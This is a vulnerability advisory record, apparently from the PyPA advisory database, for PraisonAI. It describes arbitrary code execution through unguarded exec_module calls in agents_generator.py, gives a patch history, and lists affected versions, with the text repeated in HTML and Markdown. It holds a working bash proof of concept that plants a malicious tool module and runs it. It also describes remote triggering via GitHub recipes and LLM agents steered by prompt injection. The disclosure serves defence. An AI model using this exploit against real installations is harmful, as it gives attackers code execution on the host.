@@ -1,0 +1,1071 @@
+advisory_id: praisonai/PYSEC-2026-2905
+datasource_id: pypa/praisonai/PYSEC-2026-2905
+datasource_url: https://github.com/pypa/advisory-database/blob/main/vulns/praisonai/PYSEC-2026-2905.yaml
+aliases:
+  - CVE-2026-47398
+  - GHSA-78r8-wwqv-r299
+  - PYSEC-2026-2905
+summary: |
+  PraisonAI: Arbitrary code execution via unguarded `spec.loader.exec_module` in `agents_generator.py` - sibling of CVE-2026-44334
+  <html><head></head><body><h2>Arbitrary code execution via ungated <code>spec.loader.exec_module</code> in <code>agents_generator.py</code> (v4.6.32 chokepoint refactor bypass)</h2>
+  <h3>Summary</h3>
+  <p>The v4.6.32 chokepoint refactor (which patched CVE-2026-44334 / GHSA-xcmw-grxf-wjhj) added the <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate to the <code>tool_override.py</code> sinks. However, <strong>two additional <code>spec.loader.exec_module</code> call sites</strong> in <code>praisonai/agents_generator.py</code> were missed and remain completely unguarded on current <code>master</code> (v4.6.37). Both functions accept a <code>module_path</code> parameter sourced from YAML configuration and execute it without validation, signature checking, or the env-var gate.</p>
+  <h3>Patch lineage</h3>
+
+  CVE | GHSA | Fixed in | What was patched
+  -- | -- | -- | --
+  CVE-2026-40156 | GHSA-2g3w-cpc4-chr4 | 4.5.128 | CWD tools.py auto-load in tool_resolver.py
+  CVE-2026-40287 | GHSA-g985-wjh9-qxxc | 4.5.139 | Env-var gate added to tool_resolver.py + api/call.py
+  CVE-2026-44334 | GHSA-xcmw-grxf-wjhj | 4.6.32 | Missed sink in templates/tool_override.py
+  This finding | — | unfixed | Missed sinks in agents_generator.py
+
+
+  <p>Every prior patch addressed a subset of <code>exec_module</code> call sites. The two sinks documented here were present throughout the entire fix sequence and remain unpatched.</p>
+  <h3>Vulnerable code</h3>
+  <pre><code class="language-python"># praisonai/agents_generator.py  (master HEAD; v4.6.37)
+
+  336    def load_tools_from_module(self, module_path):
+             # ...
+  349        spec = importlib.util.spec_from_file_location("tools_module", module_path)
+  350        module = importlib.util.module_from_spec(spec)
+  351        spec.loader.exec_module(module)               # ← NO gate
+
+  372    def load_tools_from_module_class(self, module_path):
+             # ...  (same pattern — spec_from_file_location → exec_module, no gate)
+  </code></pre>
+  <p>Neither function checks <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code>. Neither validates <code>module_path</code> against an allowlist. The <code>module_path</code> value originates from YAML agent configuration (<code>agents.yaml</code>) tool definitions, which can be:</p>
+  <ol>
+  <li><strong>Attacker-controlled via shared/writable config directory</strong> — same CWD-plant vector as CVE-2026-40156.</li>
+  <li><strong>Attacker-controlled via recipe/GitHub fetch</strong> — same remote trigger as CVE-2026-44334 (<code>POST /v1/recipes/run</code> with <code>allow_any_github=True</code>).</li>
+  <li><strong>Attacker-influenced via prompt injection</strong> — an LLM agent instructed to load tools from a crafted path reaches these functions through the agent orchestration layer.</li>
+  </ol>
+  <h3>Attack chain (recipe vector)</h3>
+  <pre><code>HTTP POST /v1/recipes/run
+    body: {"recipe": "github:&lt;attacker&gt;/&lt;repo&gt;/&lt;recipe&gt;"}
+          │
+          ▼
+    Recipe fetched → agents.yaml contains:
+      tools:
+        - module_path: ./evil.py        # colocated in recipe dir
+          │
+          ▼
+    AgentsGenerator.load_tools_from_module("./evil.py")
+          │
+          ▼
+    agents_generator.py:349   spec = spec_from_file_location("tools_module", "./evil.py")
+    agents_generator.py:351   spec.loader.exec_module(module)   ← RCE
+  </code></pre>
+  <p>No <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> check. No auth required (legacy server default). Module-level code executes during tool registry construction, before any LLM call.</p>
+  <h3>PoC</h3>
+  <pre><code class="language-bash">#!/usr/bin/env bash
+  # Requires: pip install praisonai (any version &gt;= 2.0.0, &lt;= 4.6.37)
+  set -euo pipefail
+
+  WORKDIR=$(mktemp -d)
+  trap "rm -rf $WORKDIR" EXIT
+
+  # 1. Malicious module
+  cat &gt; "$WORKDIR/evil.py" &lt;&lt; 'PYEOF'
+  import os, sys, tempfile, time
+  marker = os.path.join(tempfile.gettempdir(),
+                        f"praisonai_agents_gen_pwn_{int(time.time())}.txt")
+  with open(marker, "w") as f:
+      f.write(f"uid={os.getuid()} pid={os.getpid()} argv={sys.argv}\n")
+  print(f"[agents_generator bypass] RCE fired. Marker: {marker}", flush=True)
+
+  def dummy_tool():
+      """Placeholder so tool scan finds something."""
+      pass
+  PYEOF
+
+  # 2. agents.yaml that references it
+  cat &gt; "$WORKDIR/agents.yaml" &lt;&lt; 'YAMLEOF'
+  framework: praisonai
+  topic: "PoC — agents_generator exec_module bypass"
+  roles:
+    poc_agent:
+      role: PoC
+      goal: Trigger load_tools_from_module
+      backstory: n/a
+      tools:
+        - evil.py
+  YAMLEOF
+
+  # 3. Run
+  cd "$WORKDIR"
+  python -c "
+  from praisonai import PraisonAI
+  try:
+      ai = PraisonAI(agent_file='agents.yaml')
+      ai.main()
+  except Exception:
+      pass  # downstream failure expected; exec_module already fired
+  "
+
+  # 4. Verify
+  MARKER=$(ls /tmp/praisonai_agents_gen_pwn_*.txt 2&gt;/dev/null | tail -1)
+  if [ -n "$MARKER" ]; then
+      echo "SUCCESS — marker file written by server process:"
+      cat "$MARKER"
+  else
+      echo "FAIL — marker not found"
+      exit 1
+  fi
+  </code></pre>
+  <h3>Impact</h3>
+  <p>Arbitrary code execution with the privileges of the PraisonAI process. The attacker payload runs during tool registry construction — before any LLM interaction — so no API keys or model access are required for the exploit to succeed. In CI/CD and shared-server environments, any user who can write an <code>agents.yaml</code> or colocate a <code>.py</code> file achieves code execution as the service account.</p>
+  <h3>Severity</h3>
+  <p><strong>High</strong> — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8)</p>
+  <p>When combined with the recipe server's default no-auth posture and <code>allow_any_github=True</code>, the attack becomes <strong>network-reachable without authentication</strong>, elevating to:</p>
+  <p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)</p>
+  <h3>CWE</h3>
+  <ul>
+  <li>CWE-94: Improper Control of Generation of Code ('Code Injection')</li>
+  <li>CWE-426: Untrusted Search Path</li>
+  <li>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</li>
+  </ul>
+  <h3>Affected versions</h3>
+  <p>All versions containing <code>agents_generator.py</code> with these functions — at minimum <code>&gt;= 2.0.0, &lt;= 4.6.37</code> (current <code>master</code> HEAD).</p>
+  <h3>Suggested fix</h3>
+  <p>Apply the same <code>PRAISONAI_ALLOW_LOCAL_TOOLS</code> env-var gate used in <code>tool_resolver.py</code> and <code>api/call.py</code> to both call sites in <code>agents_generator.py</code>:</p>
+  <pre><code class="language-python">import os
+
+  def load_tools_from_module(self, module_path):
+      if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
+          return []
+      # ... existing logic ...
+
+  def load_tools_from_module_class(self, module_path):
+      if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
+          return []
+      # ... existing logic ...
+  </code></pre>
+  <p>Additionally, validate <code>module_path</code> against a strict allowlist of expected tool module locations rather than accepting arbitrary filesystem paths.</p>
+  <h3>Credit</h3>
+  <p>Kai Aizen &amp; Avraham Shemesh / <a href="https://snailsploit.com/">SnailSploit</a></p></body></html>## Arbitrary code execution via ungated `spec.loader.exec_module` in `agents_generator.py` (v4.6.32 chokepoint refactor bypass)
+
+  ### TL;DR
+
+  The v4.6.32 chokepoint refactor (which patched CVE-2026-44334 / GHSA-xcmw-grxf-wjhj) added the `PRAISONAI_ALLOW_LOCAL_TOOLS` env-var gate to the `tool_override.py` sinks. However, **two additional `spec.loader.exec_module` call sites** in `praisonai/agents_generator.py` were missed and remain completely unguarded on current `master` (v4.6.37). Both functions accept a `module_path` parameter sourced from YAML configuration and execute it without validation, signature checking, or the env-var gate.
+
+  ### Patch lineage
+
+  | CVE | GHSA | Fixed in | What was patched |
+  | --- | --- | --- | --- |
+  | CVE-2026-40156 | GHSA-2g3w-cpc4-chr4 | 4.5.128 | CWD `tools.py` auto-load in `tool_resolver.py` |
+  | CVE-2026-40287 | GHSA-g985-wjh9-qxxc | 4.5.139 | Env-var gate added to `tool_resolver.py` + `api/call.py` |
+  | CVE-2026-44334 | GHSA-xcmw-grxf-wjhj | 4.6.32 | Missed sink in `templates/tool_override.py` |
+  | **This finding** | — | **unfixed** | Missed sinks in `agents_generator.py` |
+
+  Every prior patch addressed a subset of `exec_module` call sites. The two sinks documented here were present throughout the entire fix sequence and remain unpatched.
+
+  ### Vulnerable code
+
+  ```python
+  # praisonai/agents_generator.py  (master HEAD; v4.6.37)
+
+  336    def load_tools_from_module(self, module_path):
+             # ...
+  349        spec = importlib.util.spec_from_file_location("tools_module", module_path)
+  350        module = importlib.util.module_from_spec(spec)
+  351        spec.loader.exec_module(module)               # ← NO gate
+
+  372    def load_tools_from_module_class(self, module_path):
+             # ...  (same pattern — spec_from_file_location → exec_module, no gate)
+  ```
+
+  Neither function checks `PRAISONAI_ALLOW_LOCAL_TOOLS`. Neither validates `module_path` against an allowlist. The `module_path` value originates from YAML agent configuration (`agents.yaml`) tool definitions, which can be:
+
+  1. **Attacker-controlled via shared/writable config directory** — same CWD-plant vector as CVE-2026-40156.
+  2. **Attacker-controlled via recipe/GitHub fetch** — same remote trigger as CVE-2026-44334 (`POST /v1/recipes/run` with `allow_any_github=True`).
+  3. **Attacker-influenced via prompt injection** — an LLM agent instructed to load tools from a crafted path reaches these functions through the agent orchestration layer.
+
+  ### Attack chain (recipe vector)
+
+  ```
+  HTTP POST /v1/recipes/run
+    body: {"recipe": "github:<attacker>/<repo>/<recipe>"}
+          │
+          ▼
+    Recipe fetched → agents.yaml contains:
+      tools:
+        - module_path: ./evil.py        # colocated in recipe dir
+          │
+          ▼
+    AgentsGenerator.load_tools_from_module("./evil.py")
+          │
+          ▼
+    agents_generator.py:349   spec = spec_from_file_location("tools_module", "./evil.py")
+    agents_generator.py:351   spec.loader.exec_module(module)   ← RCE
+  ```
+
+  No `PRAISONAI_ALLOW_LOCAL_TOOLS` check. No auth required (legacy server default). Module-level code executes during tool registry construction, before any LLM call.
+
+  ### PoC
+
+  ```bash
+  #!/usr/bin/env bash
+  # Requires: pip install praisonai (any version >= 2.0.0, <= 4.6.37)
+  set -euo pipefail
+
+  WORKDIR=$(mktemp -d)
+  trap "rm -rf $WORKDIR" EXIT
+
+  # 1. Malicious module
+  cat > "$WORKDIR/evil.py" << 'PYEOF'
+  import os, sys, tempfile, time
+  marker = os.path.join(tempfile.gettempdir(),
+                        f"praisonai_agents_gen_pwn_{int(time.time())}.txt")
+  with open(marker, "w") as f:
+      f.write(f"uid={os.getuid()} pid={os.getpid()} argv={sys.argv}\n")
+  print(f"[agents_generator bypass] RCE fired. Marker: {marker}", flush=True)
+
+  def dummy_tool():
+      """Placeholder so tool scan finds something."""
+      pass
+  PYEOF
+
+  # 2. agents.yaml that references it
+  cat > "$WORKDIR/agents.yaml" << 'YAMLEOF'
+  framework: praisonai
+  topic: "PoC — agents_generator exec_module bypass"
+  roles:
+    poc_agent:
+      role: PoC
+      goal: Trigger load_tools_from_module
+      backstory: n/a
+      tools:
+        - evil.py
+  YAMLEOF
+
+  # 3. Run
+  cd "$WORKDIR"
+  python -c "
+  from praisonai import PraisonAI
+  try:
+      ai = PraisonAI(agent_file='agents.yaml')
+      ai.main()
+  except Exception:
+      pass  # downstream failure expected; exec_module already fired
+  "
+
+  # 4. Verify
+  MARKER=$(ls /tmp/praisonai_agents_gen_pwn_*.txt 2>/dev/null | tail -1)
+  if [ -n "$MARKER" ]; then
+      echo "SUCCESS — marker file written by server process:"
+      cat "$MARKER"
+  else
+      echo "FAIL — marker not found"
+      exit 1
+  fi
+  ```
+
+  ### Impact
+
+  Arbitrary code execution with the privileges of the PraisonAI process. The attacker payload runs during tool registry construction — before any LLM interaction — so no API keys or model access are required for the exploit to succeed. In CI/CD and shared-server environments, any user who can write an `agents.yaml` or colocate a `.py` file achieves code execution as the service account.
+
+  ### Severity
+
+  **High** — CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8)
+
+  When combined with the recipe server's default no-auth posture and `allow_any_github=True`, the attack becomes **network-reachable without authentication**, elevating to:
+
+  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)
+
+  ### CWE
+
+  - CWE-94: Improper Control of Generation of Code ('Code Injection')
+  - CWE-426: Untrusted Search Path
+  - CWE-829: Inclusion of Functionality from Untrusted Control Sphere
+
+  ### Affected versions
+
+  All versions containing `agents_generator.py` with these functions — at minimum `>= 2.0.0, <= 4.6.37` (current `master` HEAD).
+
+  ### Suggested fix
+
+  Apply the same `PRAISONAI_ALLOW_LOCAL_TOOLS` env-var gate used in `tool_resolver.py` and `api/call.py` to both call sites in `agents_generator.py`:
+
+  ```python
+  import os
+
+  def load_tools_from_module(self, module_path):
+      if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
+          return []
+      # ... existing logic ...
+
+  def load_tools_from_module_class(self, module_path):
+      if os.environ.get("PRAISONAI_ALLOW_LOCAL_TOOLS", "").lower() != "true":
+          return []
+      # ... existing logic ...
+  ```
+
+  Additionally, validate `module_path` against a strict allowlist of expected tool module locations rather than accepting arbitrary filesystem paths.
+
+  ### Credit
+
+  Kai Aizen & Avraham Shemesh / [[SnailSploit](https://snailsploit.com/)](https://snailsploit.com)
+impacted_packages:
+  - purl: pkg:pypi/praisonai
+    affected_versions: vers:pypi/0.0.1|0.0.2|0.0.3|0.0.4|0.0.5|0.0.6|0.0.7|0.0.8|0.0.9|0.0.10|0.0.11|0.0.12|0.0.13|0.0.14|0.0.15|0.0.16|0.0.17|0.0.18|0.0.19|0.0.20|0.0.21|0.0.22|0.0.23|0.0.24|0.0.25|0.0.26|0.0.27|0.0.28|0.0.29|0.0.30|0.0.31|0.0.32|0.0.33|0.0.34|0.0.35|0.0.36|0.0.37|0.0.38|0.0.39|0.0.40|0.0.41|0.0.42|0.0.43|0.0.44|0.0.45|0.0.46|0.0.47|0.0.48|0.0.49|0.0.50|0.0.52|0.0.53|0.0.54|0.0.55|0.0.56|0.0.57|0.0.58|0.0.59rc2|0.0.59rc3|0.0.59rc5|0.0.59rc6|0.0.59rc7|0.0.59rc8|0.0.59rc9|0.0.59rc11|0.0.59|0.0.61|0.0.64|0.0.65|0.0.66|0.0.67|0.0.68|0.0.69|0.0.70|0.0.71|0.0.72|0.0.73|0.0.74|0.1.0|0.1.1|0.1.2|0.1.3|0.1.4|0.1.5|0.1.6|0.1.7|0.1.8|0.1.9|0.1.10|1.0.0|1.0.1|1.0.2|1.0.3|1.0.4|1.0.5|1.0.6|1.0.8|1.0.9|1.0.10|1.0.11|2.0.0|2.0.1|2.0.2|2.0.3|2.0.5|2.0.6|2.0.7|2.0.8|2.0.9|2.0.10|2.0.11|2.0.12|2.0.13|2.0.14|2.0.15|2.0.16|2.0.17|2.0.18|2.0.19|2.0.20|2.0.22|2.0.23|2.0.24|2.0.25|2.0.26|2.0.27|2.0.28|2.0.29|2.0.30|2.0.31|2.0.32|2.0.33|2.0.34|2.0.35|2.0.36|2.0.37|2.0.38|2.0.39|2.0.40|2.0.41|2.0.42|2.0.43|2.0.44|2.0.45|2.0.46|2.0.47|2.0.48|2.0.49|2.0.50|2.0.51|2.0.53|2.0.54|2.0.55|2.0.56|2.0.57|2.0.58|2.0.59|2.0.60|2.0.61|2.0.62|2.0.63|2.0.64|2.0.65|2.0.66|2.0.67|2.0.68|2.0.69|2.0.70|2.0.71|2.0.72|2.0.73|2.0.74|2.0.75|2.0.76|2.0.77|2.0.78|2.0.79|2.0.80|2.0.81|2.1.0|2.1.1|2.1.4|2.1.5|2.1.6|2.2.1|2.2.2|2.2.3|2.2.4|2.2.5|2.2.6|2.2.7|2.2.8|2.2.9|2.2.10|2.2.11|2.2.12|2.2.13|2.2.14|2.2.15|2.2.16|2.2.17|2.2.18|2.2.19|2.2.20|2.2.21|2.2.22|2.2.24|2.2.25|2.2.26|2.2.27|2.2.28|2.2.29|2.2.30|2.2.31|2.2.32|2.2.33|2.2.34|2.2.35|2.2.36|2.2.37|2.2.38|2.2.39|2.2.40|2.2.41|2.2.42|2.2.43|2.2.44|2.2.45|2.2.46|2.2.47|2.2.48|2.2.49|2.2.50|2.2.51|2.2.52|2.2.53|2.2.54|2.2.55|2.2.56|2.2.57|2.2.58|2.2.59|2.2.60|2.2.61|2.2.62|2.2.63|2.2.64|2.2.65|2.2.66|2.2.67|2.2.68|2.2.69|2.2.70|2.2.71|2.2.72|2.2.73|2.2.74|2.2.75|2.2.76|2.2.77|2.2.78|2.2.79|2.2.80|2.2.81|2.2.82|2.2.83|2.2.84|2.2.86|2.2.87|2.2.88|2.2.89|2.2.90|2.2.91|2.2.93|2.2.95|2.2.96|2.2.97|2.2.98|2.2.99|2.3.0|2.3.1|2.3.2|2.3.3|2.3.4|2.3.5|2.3.6|2.3.7|2.3.8|2.3.9|2.3.10|2.3.11|2.3.12|2.3.13|2.3.14|2.3.15|2.3.16|2.3.18|2.3.19|2.3.20|2.3.21|2.3.22|2.3.23|2.3.24|2.3.25|2.3.26|2.3.27|2.3.28|2.3.29|2.3.30|2.3.31|2.3.32|2.3.33|2.3.34|2.3.35|2.3.36|2.3.37|2.3.38|2.3.39|2.3.40|2.3.41|2.3.42|2.3.43|2.3.44|2.3.45|2.3.46|2.3.47|2.3.48|2.3.49|2.3.50|2.3.51|2.3.52|2.3.53|2.3.54|2.3.55|2.3.56|2.3.57|2.3.58|2.3.59|2.3.60|2.3.61|2.3.62|2.3.63|2.3.64|2.3.65|2.3.66|2.3.67|2.3.68|2.3.69|2.3.70|2.3.71|2.3.72|2.3.73|2.3.74|2.3.75|2.3.76|2.3.77|2.3.78|2.3.79|2.3.80|2.3.81|2.3.82|2.3.83|2.3.84|2.3.85|2.3.86|2.3.87|2.4.0|2.4.1|2.4.2|2.4.3|2.4.4|2.5.0|2.5.1|2.5.2|2.5.3|2.5.4|2.5.5|2.5.6|2.5.7|2.6.0|2.6.1|2.6.2|2.6.3|2.6.4|2.6.5|2.6.6|2.6.7|2.6.8|2.7.0|2.8.3|2.8.4|2.8.5|2.8.6|2.8.7|2.8.8|2.8.9|2.9.0|2.9.1|2.9.2|3.0.0|3.0.1|3.0.2|3.0.3|3.0.4|3.0.5|3.0.6|3.0.7|3.0.8|3.0.9|3.1.0|3.1.1|3.1.2|3.1.3|3.1.4|3.1.5|3.1.6|3.1.7|3.1.8|3.1.9|3.2.0|3.2.1|3.3.0|3.3.1|3.4.0|3.4.1|3.5.0|3.5.1|3.5.2|3.5.3|3.5.4|3.5.5|3.5.6|3.5.7|3.5.8|3.5.9|3.6.0|3.6.1|3.6.2|3.7.0|3.7.1|3.7.2|3.7.3|3.7.4|3.7.5|3.7.6|3.7.7|3.7.8|3.7.9|3.8.0|3.8.1|3.8.2|3.8.3|3.8.4|3.8.5|3.8.6|3.8.7|3.8.8|3.8.9|3.8.10|3.8.11|3.8.12|3.8.13|3.8.14|3.8.16|3.8.17|3.8.18|3.8.19|3.8.20|3.8.21|3.8.22|3.9.0|3.9.1|3.9.2|3.9.3|3.9.4|3.9.5|3.9.6|3.9.7|3.9.8|3.9.9|3.9.10|3.9.11|3.9.12|3.9.13|3.9.14|3.9.15|3.9.16|3.9.17|3.9.18|3.9.19|3.9.20|3.9.21|3.9.22|3.9.23|3.9.24|3.9.25|3.9.26|3.9.27|3.9.28|3.9.29|3.9.30|3.9.31|3.9.32|3.9.33|3.9.34|3.9.35|3.10.0|3.10.1|3.10.2|3.10.3|3.10.4|3.10.5|3.10.6|3.10.7|3.10.8|3.10.9|3.10.10|3.10.11|3.10.12|3.10.13|3.10.14|3.10.15|3.10.16|3.10.17|3.10.18|3.10.19|3.10.20|3.10.21|3.10.22|3.10.23|3.10.24|3.10.25|3.10.26|3.10.27|3.11.0|3.11.1|3.11.2|3.11.3|3.11.4|3.11.8|3.11.9|3.11.10|3.11.11|3.11.12|3.11.13|3.11.14|3.12.0|3.12.1|3.12.2|3.12.3|4.0.0|4.1.0|4.2.0|4.2.1|4.2.2|4.2.3|4.2.4|4.3.0|4.3.1|4.4.0|4.4.2|4.4.3|4.4.4|4.4.5|4.4.6|4.4.7|4.4.8|4.4.9|4.4.10|4.4.11|4.4.12|4.5.0|4.5.1|4.5.2|4.5.3|4.5.5|4.5.6|4.5.7|4.5.8|4.5.9|4.5.10|4.5.11|4.5.12|4.5.13|4.5.14|4.5.15|4.5.16|4.5.18|4.5.19|4.5.20|4.5.21|4.5.22|4.5.23|4.5.24|4.5.25|4.5.26|4.5.27|4.5.28|4.5.29|4.5.30|4.5.31|4.5.32|4.5.33|4.5.34|4.5.35|4.5.36|4.5.37|4.5.38|4.5.39|4.5.40|4.5.41|4.5.42|4.5.43|4.5.44|4.5.45|4.5.46|4.5.48|4.5.49|4.5.51|4.5.52|4.5.54|4.5.55|4.5.56|4.5.57|4.5.58|4.5.59|4.5.60|4.5.62|4.5.63|4.5.64|4.5.65|4.5.67|4.5.68|4.5.69|4.5.70|4.5.71|4.5.72|4.5.73|4.5.74|4.5.76|4.5.77|4.5.78|4.5.79|4.5.80|4.5.81|4.5.82|4.5.83|4.5.85|4.5.87|4.5.88|4.5.89|4.5.90|4.5.93|4.5.94|4.5.95|4.5.96|4.5.97|4.5.98|4.5.100|4.5.101|4.5.102|4.5.103|4.5.104|4.5.105|4.5.106|4.5.107|4.5.108|4.5.109|4.5.110|4.5.111|4.5.112|4.5.113|4.5.114|4.5.115|4.5.117|4.5.118|4.5.119|4.5.120|4.5.121|4.5.122|4.5.123|4.5.124|4.5.125|4.5.126|4.5.127|4.5.128|4.5.129|4.5.130|4.5.131|4.5.132|4.5.133|4.5.134|4.5.135|4.5.136|4.5.137|4.5.139|4.5.140|4.5.143|4.5.144|4.5.145|4.5.149|4.6.9|4.6.10|4.6.11|4.6.12|4.6.13|4.6.14|4.6.15|4.6.16|4.6.18|4.6.19|4.6.20|4.6.21|4.6.22|4.6.23|4.6.24|4.6.25|4.6.26|4.6.27|4.6.28|4.6.29|4.6.30|4.6.31|4.6.32|4.6.33|4.6.34|4.6.35|4.6.36|4.6.37|4.6.38|4.6.39
+    fixed_versions: vers:pypi/4.6.40
+    affected_packages:
+      - pkg:pypi/praisonai@0.0.1
+      - pkg:pypi/praisonai@0.0.2
+      - pkg:pypi/praisonai@0.0.3
+      - pkg:pypi/praisonai@0.0.4
+      - pkg:pypi/praisonai@0.0.5
+      - pkg:pypi/praisonai@0.0.6
+      - pkg:pypi/praisonai@0.0.7
+      - pkg:pypi/praisonai@0.0.8
+      - pkg:pypi/praisonai@0.0.9
+      - pkg:pypi/praisonai@0.0.10
+      - pkg:pypi/praisonai@0.0.11
+      - pkg:pypi/praisonai@0.0.12
+      - pkg:pypi/praisonai@0.0.13
+      - pkg:pypi/praisonai@0.0.14
+      - pkg:pypi/praisonai@0.0.15
+      - pkg:pypi/praisonai@0.0.16
+      - pkg:pypi/praisonai@0.0.17
+      - pkg:pypi/praisonai@0.0.18
+      - pkg:pypi/praisonai@0.0.19
+      - pkg:pypi/praisonai@0.0.20
+      - pkg:pypi/praisonai@0.0.21
+      - pkg:pypi/praisonai@0.0.22
+      - pkg:pypi/praisonai@0.0.23
+      - pkg:pypi/praisonai@0.0.24
+      - pkg:pypi/praisonai@0.0.25
+      - pkg:pypi/praisonai@0.0.26
+      - pkg:pypi/praisonai@0.0.27
+      - pkg:pypi/praisonai@0.0.28
+      - pkg:pypi/praisonai@0.0.29
+      - pkg:pypi/praisonai@0.0.30
+      - pkg:pypi/praisonai@0.0.31
+      - pkg:pypi/praisonai@0.0.32
+      - pkg:pypi/praisonai@0.0.33
+      - pkg:pypi/praisonai@0.0.34
+      - pkg:pypi/praisonai@0.0.35
+      - pkg:pypi/praisonai@0.0.36
+      - pkg:pypi/praisonai@0.0.37
+      - pkg:pypi/praisonai@0.0.38
+      - pkg:pypi/praisonai@0.0.39
+      - pkg:pypi/praisonai@0.0.40
+      - pkg:pypi/praisonai@0.0.41
+      - pkg:pypi/praisonai@0.0.42
+      - pkg:pypi/praisonai@0.0.43
+      - pkg:pypi/praisonai@0.0.44
+      - pkg:pypi/praisonai@0.0.45
+      - pkg:pypi/praisonai@0.0.46
+      - pkg:pypi/praisonai@0.0.47
+      - pkg:pypi/praisonai@0.0.48
+      - pkg:pypi/praisonai@0.0.49
+      - pkg:pypi/praisonai@0.0.50
+      - pkg:pypi/praisonai@0.0.52
+      - pkg:pypi/praisonai@0.0.53
+      - pkg:pypi/praisonai@0.0.54
+      - pkg:pypi/praisonai@0.0.55
+      - pkg:pypi/praisonai@0.0.56
+      - pkg:pypi/praisonai@0.0.57
+      - pkg:pypi/praisonai@0.0.58
+      - pkg:pypi/praisonai@0.0.59rc2
+      - pkg:pypi/praisonai@0.0.59rc3
+      - pkg:pypi/praisonai@0.0.59rc5
+      - pkg:pypi/praisonai@0.0.59rc6
+      - pkg:pypi/praisonai@0.0.59rc7
+      - pkg:pypi/praisonai@0.0.59rc8
+      - pkg:pypi/praisonai@0.0.59rc9
+      - pkg:pypi/praisonai@0.0.59rc11
+      - pkg:pypi/praisonai@0.0.59
+      - pkg:pypi/praisonai@0.0.61
+      - pkg:pypi/praisonai@0.0.64
+      - pkg:pypi/praisonai@0.0.65
+      - pkg:pypi/praisonai@0.0.66
+      - pkg:pypi/praisonai@0.0.67
+      - pkg:pypi/praisonai@0.0.68
+      - pkg:pypi/praisonai@0.0.69
+      - pkg:pypi/praisonai@0.0.70
+      - pkg:pypi/praisonai@0.0.71
+      - pkg:pypi/praisonai@0.0.72
+      - pkg:pypi/praisonai@0.0.73
+      - pkg:pypi/praisonai@0.0.74
+      - pkg:pypi/praisonai@0.1.0
+      - pkg:pypi/praisonai@0.1.1
+      - pkg:pypi/praisonai@0.1.2
+      - pkg:pypi/praisonai@0.1.3
+      - pkg:pypi/praisonai@0.1.4
+      - pkg:pypi/praisonai@0.1.5
+      - pkg:pypi/praisonai@0.1.6
+      - pkg:pypi/praisonai@0.1.7
+      - pkg:pypi/praisonai@0.1.8
+      - pkg:pypi/praisonai@0.1.9
+      - pkg:pypi/praisonai@0.1.10
+      - pkg:pypi/praisonai@1.0.0
+      - pkg:pypi/praisonai@1.0.1
+      - pkg:pypi/praisonai@1.0.2
+      - pkg:pypi/praisonai@1.0.3
+      - pkg:pypi/praisonai@1.0.4
+      - pkg:pypi/praisonai@1.0.5
+      - pkg:pypi/praisonai@1.0.6
+      - pkg:pypi/praisonai@1.0.8
+      - pkg:pypi/praisonai@1.0.9
+      - pkg:pypi/praisonai@1.0.10
+      - pkg:pypi/praisonai@1.0.11
+      - pkg:pypi/praisonai@2.0.0
+      - pkg:pypi/praisonai@2.0.1
+      - pkg:pypi/praisonai@2.0.2
+      - pkg:pypi/praisonai@2.0.3
+      - pkg:pypi/praisonai@2.0.5
+      - pkg:pypi/praisonai@2.0.6
+      - pkg:pypi/praisonai@2.0.7
+      - pkg:pypi/praisonai@2.0.8
+      - pkg:pypi/praisonai@2.0.9
+      - pkg:pypi/praisonai@2.0.10
+      - pkg:pypi/praisonai@2.0.11
+      - pkg:pypi/praisonai@2.0.12
+      - pkg:pypi/praisonai@2.0.13
+      - pkg:pypi/praisonai@2.0.14
+      - pkg:pypi/praisonai@2.0.15
+      - pkg:pypi/praisonai@2.0.16
+      - pkg:pypi/praisonai@2.0.17
+      - pkg:pypi/praisonai@2.0.18
+      - pkg:pypi/praisonai@2.0.19
+      - pkg:pypi/praisonai@2.0.20
+      - pkg:pypi/praisonai@2.0.22
+      - pkg:pypi/praisonai@2.0.23
+      - pkg:pypi/praisonai@2.0.24
+      - pkg:pypi/praisonai@2.0.25
+      - pkg:pypi/praisonai@2.0.26
+      - pkg:pypi/praisonai@2.0.27
+      - pkg:pypi/praisonai@2.0.28
+      - pkg:pypi/praisonai@2.0.29
+      - pkg:pypi/praisonai@2.0.30
+      - pkg:pypi/praisonai@2.0.31
+      - pkg:pypi/praisonai@2.0.32
+      - pkg:pypi/praisonai@2.0.33
+      - pkg:pypi/praisonai@2.0.34
+      - pkg:pypi/praisonai@2.0.35
+      - pkg:pypi/praisonai@2.0.36
+      - pkg:pypi/praisonai@2.0.37
+      - pkg:pypi/praisonai@2.0.38
+      - pkg:pypi/praisonai@2.0.39
+      - pkg:pypi/praisonai@2.0.40
+      - pkg:pypi/praisonai@2.0.41
+      - pkg:pypi/praisonai@2.0.42
+      - pkg:pypi/praisonai@2.0.43
+      - pkg:pypi/praisonai@2.0.44
+      - pkg:pypi/praisonai@2.0.45
+      - pkg:pypi/praisonai@2.0.46
+      - pkg:pypi/praisonai@2.0.47
+      - pkg:pypi/praisonai@2.0.48
+      - pkg:pypi/praisonai@2.0.49
+      - pkg:pypi/praisonai@2.0.50
+      - pkg:pypi/praisonai@2.0.51
+      - pkg:pypi/praisonai@2.0.53
+      - pkg:pypi/praisonai@2.0.54
+      - pkg:pypi/praisonai@2.0.55
+      - pkg:pypi/praisonai@2.0.56
+      - pkg:pypi/praisonai@2.0.57
+      - pkg:pypi/praisonai@2.0.58
+      - pkg:pypi/praisonai@2.0.59
+      - pkg:pypi/praisonai@2.0.60
+      - pkg:pypi/praisonai@2.0.61
+      - pkg:pypi/praisonai@2.0.62
+      - pkg:pypi/praisonai@2.0.63
+      - pkg:pypi/praisonai@2.0.64
+      - pkg:pypi/praisonai@2.0.65
+      - pkg:pypi/praisonai@2.0.66
+      - pkg:pypi/praisonai@2.0.67
+      - pkg:pypi/praisonai@2.0.68
